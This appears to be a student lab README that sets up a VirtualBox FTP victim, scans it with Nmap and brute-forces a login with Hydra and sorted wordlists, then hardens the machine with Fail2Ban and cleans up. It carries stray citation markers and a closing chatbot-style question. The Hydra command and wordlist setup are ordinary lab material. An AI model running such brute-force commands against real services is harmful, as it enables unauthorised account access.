# Dictionaries, Scanning, and Hydra over FTP

## 📋 Description

[cite_start]This repository contains the documentation and scripts used in the RA1-5.AEE practice to set up and simulate a controlled brute-force attack against an FTP service that uses clear-text authentication[cite: 19].

The goal is for the student to design, implement, and document a replicable didactic environment to experiment with:
1.  [cite_start]Risks associated with clear-text authentication protocols (**FTP**)[cite: 19].
2.  [cite_start]Basic reconnaissance techniques (**Nmap**)[cite: 20].
3.  [cite_start]Brute-force attacks (**Hydra**) using optimized dictionaries (sorted by entropy)[cite: 20, 22].

## 🛠️ Environment and Tools Used

* [cite_start]**Deployment Platform:** VirtualBox[cite: 26].
* [cite_start]**Victim Machine:** OSBoxes with `vsftpd` service[cite: 27].
* [cite_start]**Attacker Machine:** Kali Linux (for tools like `Hydra` and `Nmap`)[cite: 46, 51].
* **Key Tools:**
    * [cite_start]`vsftpd`: FTP server[cite: 27].
    * [cite_start]`Hydra`: Brute-force tool[cite: 51].
    * [cite_start]`Nmap`: Port scanner[cite: 51, 94].
    * [cite_start]`Python3`: For the entropy sorting script[cite: 51, 72].
    * [cite_start]`Fail2Ban`: For final hardening of the victim machine[cite: 171, 172].

## 📝 Step-by-Step Guide (Commands Executed)

Below are the key commands executed on the victim and attacker machines to configure the environment and perform the attack.

### A. Victim Machine Configuration (FTP Service)

| Command | Description |
| :--- | :--- |
| `sudo apt install vsftpd -y` | [cite_start]Installs the clear-text FTP server[cite: 28, 29]. |
| `sudo systemctl restart vsftpd` | [cite_start]Restarts the `vsftpd` service[cite: 31]. |
| `sudo systemctl enable vsftpd` | [cite_start]Ensures the FTP service is always running[cite: 31]. |
| `sudo adduser ftpuser` | [cite_start]Creates the target user for the attack (password: `ftp12345`)[cite: 35, 45, 46]. |
| `sudo ufw allow 21/tcp` | [cite_start]Activates port 21 on the victim machine's firewall[cite: 92, 93]. |

### B. Attacker Machine Configuration (Tools and Dictionaries)

| Command | Description |
| :--- | :--- |
| `sudo apt update` | [cite_start]Updates the package list[cite: 50]. |
| `sudo apt install hydra nmap git python3 python3-pip -y` | [cite_start]Installs the necessary tools (`Hydra`, `Nmap`, `Git`, `Python3`)[cite: 51, 53]. |
| `mkdir ~/diccionarios` | [cite_start]Creates a directory to collect dictionaries[cite: 57]. |
| `cd ~/diccionarios` | [cite_start]Navigates to the new directory[cite: 58]. |
| `git clone https://github.com/danielmiessler/SecLists.git` | [cite_start]Downloads the SecLists dictionary repository[cite: 59, 60]. |
| `git clone https://github.com/berzerk0/Probable-Wordlists.git` | [cite_start]Downloads the Probable-Wordlists repository[cite: 61]. |
| `python3 ordenar_entropia.py diccionario_top.txt` | [cite_start]Executes the script to optimize the dictionary by entropy, making Hydra more efficient[cite: 91, 114, 115]. |

### C. Reconnaissance and Attack Phase

| Command | Description |
| :--- | :--- |
| `nmap -p 21 10.0.2.5` | [cite_start]Scans the victim machine to confirm that port 21 (FTP) is open[cite: 97, 105]. |
| `hydra -l ftpuser -P diccionario_top.txt ftp://10.0.2.5 -o hydra_found.txt -t 4 -V` | [cite_start]Initiates the brute-force attack with Hydra: user `ftpuser`, using the optimized dictionary, against the IP `10.0.2.5`[cite: 119, 144]. |

### D. Hardening and Cleanup (Post-Attack)

| Command | Description |
| :--- | :--- |
| `sudo apt install fail2ban -y` | [cite_start]Installs Fail2Ban to protect against brute-force attacks[cite: 172]. |
| `sudo systemctl enable fail2ban` | [cite_start]Enables Fail2Ban to start on boot[cite: 177]. |
| `sudo systemctl start fail2ban` | [cite_start]Starts the Fail2Ban service[cite: 178]. |
| `sudo nano /etc/fail2ban/jail.local` | [cite_start]Edits the configuration file to add the attacker's IP to the whitelist (`Ignoreip 10.0.2.15/24`)[cite: 188, 191, 193]. |
| `sudo ufw delete allow 21/tcp` | [cite_start]**Closes port 21**[cite: 179]. |
| `sudo userdel -r ftpuser` | [cite_start]**Removes the test user**[cite: 180]. |
| `sudo systemctl disable vsftpd` | [cite_start]**Disables the vsftpd service** to prevent permanent vulnerabilities[cite: 181, 182]. |

---

Would you like to review the Python script code for `ordenar_entropia.py`?
